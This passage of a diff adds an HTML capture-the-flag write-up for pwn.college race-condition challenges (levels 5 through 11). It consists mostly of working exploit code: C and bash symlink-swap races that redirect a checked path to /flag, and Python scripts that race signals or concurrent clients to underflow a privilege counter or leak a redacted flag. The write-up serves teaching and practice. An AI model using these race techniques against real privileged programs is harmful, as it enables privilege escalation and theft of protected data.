+</span><span>	</span><span style="color:#bf616a;">nanosleep</span><span>(&amp;sleep_ts, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>	</span><span style="color:#bf616a;">unlink</span><span>(&quot;</span><span style="color:#a3be8c;">a</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">mkdir</span><span>(&quot;</span><span style="color:#a3be8c;">a</span><span>&quot;, </span><span style="color:#d08770;">0777</span><span>);
+</span><span>	</span><span style="color:#b48ead;">int</span><span> x = </span><span style="color:#bf616a;">symlink</span><span>(&quot;</span><span style="color:#a3be8c;">/flag</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">a/sem</span><span>&quot;);
+</span><span>}
+</span></code></pre>
+<p>racetest.sh:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>#!/bin/bash
+</span><span>
+</span><span>ln -s /proc/sys/kernel/ a
+</span><span>./race
+</span><span>
+</span><span>sleep 0.1
+</span><span>rm -r a
+</span></code></pre>
+<h1 id="level-6">Level 6</h1>
+<p>Like level 5, but it wants the directory containing the file to be real, so we can just step our symlink up to /proc/sys and request a/kernel/sem to pass the checks. the creation of the flag symlink now requires making an additional &quot;a/kernel&quot; directory as well, so our timings will need adjusting.</p>
+<p>Compile, make the long path, and run racetest.sh in a loop like for level 5</p>
+<p>race.c:</p>
+<pre data-lang="C" style="background-color:#2b303b;color:#c0c5ce;" class="language-C "><code class="language-C" data-lang="C"><span style="color:#b48ead;">#define </span><span>_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sched.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">time.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">unistd.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">char </span><span>**</span><span style="color:#bf616a;">argv</span><span>, </span><span style="color:#b48ead;">char </span><span>**</span><span style="color:#bf616a;">environ</span><span>) {
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">char </span><span>*runchal[] = {
+</span><span>		&quot;</span><span style="color:#a3be8c;">/challenge/babyrace_level6.1</span><span>&quot;,
+</span><span>		&quot;</span><span style="color:#a3be8c;">/home/hacker/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/kernel/sem</span><span>&quot;,
+</span><span>		NULL
+</span><span>	};
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> timespec sleep_ts = {
+</span><span>		.</span><span style="color:#bf616a;">tv_sec </span><span>= </span><span style="color:#d08770;">0</span><span>,
+</span><span>		.</span><span style="color:#bf616a;">tv_nsec </span><span>= </span><span style="color:#d08770;">580000</span><span>,
+</span><span>	};
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">fork</span><span>()) {
+</span><span>		</span><span style="color:#bf616a;">execve</span><span>(runchal[</span><span style="color:#d08770;">0</span><span>], runchal, environ);
+</span><span>		</span><span style="color:#96b5b4;">exit</span><span>(</span><span style="color:#d08770;">0</span><span>);
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#bf616a;">nanosleep</span><span>(&amp;sleep_ts, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>	</span><span style="color:#bf616a;">unlink</span><span>(&quot;</span><span style="color:#a3be8c;">a</span><span>&quot;);
+</span><span>	</span><span style="color:#bf616a;">mkdir</span><span>(&quot;</span><span style="color:#a3be8c;">a</span><span>&quot;, </span><span style="color:#d08770;">0777</span><span>);
+</span><span>	</span><span style="color:#bf616a;">mkdir</span><span>(&quot;</span><span style="color:#a3be8c;">a/kernel</span><span>&quot;, </span><span style="color:#d08770;">0777</span><span>);
+</span><span>	</span><span style="color:#b48ead;">int</span><span> x = </span><span style="color:#bf616a;">symlink</span><span>(&quot;</span><span style="color:#a3be8c;">/flag</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">a/kernel/sem</span><span>&quot;);
+</span><span>}
+</span></code></pre>
+<p>racetest.sh:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#65737e;">#!/bin/bash
+</span><span>
+</span><span style="color:#bf616a;">ln -s</span><span> /proc/sys a
+</span><span style="color:#bf616a;">./race
+</span><span>
+</span><span style="color:#bf616a;">sleep</span><span> 0.1
+</span><span style="color:#bf616a;">rm -r</span><span> a
+</span></code></pre>
+<h1 id="level-7">Level 7</h1>
+<p>The SIGALRM resets our level to 0. This means if it happens at the correct time during a &quot;logout&quot;, it will set level to 0, then the logout will subtract, underflowing it to give us max privileges.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>os
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyrace_level7.1</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;)
+</span><span>
+</span><span>        r.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">logout</span><span>&#39;)
+</span><span>        r.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>        os.</span><span style="color:#bf616a;">kill</span><span>(r.pid, signal.</span><span style="color:#bf616a;">SIGALRM</span><span>)
+</span><span>
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">win_authed</span><span>&#39;)
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">quit</span><span>&#39;)
+</span><span>        x = r.</span><span style="color:#bf616a;">recvall</span><span>()
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&#39;</span><span style="color:#a3be8c;">pwn</span><span>&#39; in x:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(x.</span><span style="color:#bf616a;">decode</span><span>())
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>        r.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-8">Level 8</h1>
+<p>Racing via 2 clients connected to a remote. level is shared across all connections, so if 2 clients request logout at the same time, it may underflow like in level 7.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyrace_level8.1</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>        p1 = </span><span style="color:#bf616a;">remote</span><span>(&#39;</span><span style="color:#a3be8c;">localhost</span><span>&#39;, </span><span style="color:#d08770;">1337</span><span>)
+</span><span>        p2 = </span><span style="color:#bf616a;">remote</span><span>(&#39;</span><span style="color:#a3be8c;">localhost</span><span>&#39;, </span><span style="color:#d08770;">1337</span><span>)
+</span><span>
+</span><span>        p1.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;)
+</span><span>
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">logout</span><span>&#39;)
+</span><span>        p2.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">logout</span><span>&#39;)
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>        p2.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>        p1.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">win_authed</span><span>&#39;)
+</span><span>        x = p1.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&#39;</span><span style="color:#a3be8c;">pwn</span><span>&#39; in x:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(x.</span><span style="color:#bf616a;">decode</span><span>())
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>        p1.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>        p2.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-9">Level 9</h1>
+<p>The send_redacted_flag command basically writes &quot;REDACTED: \x00<flag>&quot; so that when receive_message is called, it stops at the null byte rather than printing out the flag. Our race is going to be using client A to send_message (which writes 1 byte at a time to memory) to overwrite that null byte while using client B to receive_message. If we receive the message while the null byte is overwritten but the send_message hasn't completed (or at least hasn't written the null byte at the end of its own message) then we should be able to see the flag.</p>
+<p>Note that we know the first few bytes of the flag are &quot;pwn.college{&quot; so we can clobber those and be okay, meaning we can send a slightly longer message, extending the window for our receive_message to be able to read the flag.</p>
+<p>I switched from using pwntools for interacting with the challenge to python sockets, not sure if it is actually a significant impact on the timing or not. You could also totally start the challenge server process from inside the script rather than backgrounding it from the terminal before running the script, but this was the way I preferred to do it for debugging, didn't have to wait for the challenge to start every time.</p>
+<p>You'll also notice that the challenge is being run with nice to reduce its scheduling priority. Not sure if it actually had any impact but theoretically it should widen our race condition windows.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span style="color:#b48ead;">import </span><span>socket
+</span><span>
+</span><span style="color:#65737e;"># run challenge with:
+</span><span style="color:#65737e;"># nice -n19 /challenge/babyrace_level9.1 &amp;
+</span><span>
+</span><span style="color:#65737e;"># if this succeeds, the printout will have the flag but have clobbered some part of &quot;pwn.college{&quot;, but the rest of the flag should be there
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    p1 = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>    p1.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">127.0.0.1</span><span>&quot;, </span><span style="color:#d08770;">1337</span><span>))
+</span><span>
+</span><span>    p2 = socket.</span><span style="color:#bf616a;">socket</span><span>(socket.</span><span style="color:#bf616a;">AF_INET</span><span>, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span>)
+</span><span>    p2.</span><span style="color:#bf616a;">connect</span><span>((&quot;</span><span style="color:#a3be8c;">127.0.0.1</span><span>&quot;, </span><span style="color:#d08770;">1337</span><span>))
+</span><span>    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">send_redacted_flag</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>
+</span><span>        p1.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">0x1000</span><span>)
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">send_message</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>
+</span><span>        p1.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">0x1000</span><span>)
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">22</span><span>)
+</span><span>
+</span><span>        p2.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">receive_message</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>        p1.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>
+</span><span>
+</span><span>        </span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">0.1</span><span>)
+</span><span>        y = p2.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">0x1000</span><span>)
+</span><span>
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(y.</span><span style="color:#bf616a;">decode</span><span>())
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&#39;</span><span style="color:#a3be8c;">}</span><span>&#39; in y:
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>    p1.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>    p2.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>    </span><span style="color:#bf616a;">exit</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-10">Level 10</h1>
+<p>Use same script as for 9, it will work but it will take a while longer, go get a drink or something.</p>
+<h1 id="level-11">Level 11</h1>
+<p>Same script as 9, but I noticed we were getting lots of &quot;REDACTED&quot;, implying our receive was going too early, so I just flipped the order of <code>p1.send(b'\n')</code> and <code>p2.send(b'receive_message\n')</code></p>
+<p>Like level10, just takes a while but will get there eventually, we only need to win once.</p>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
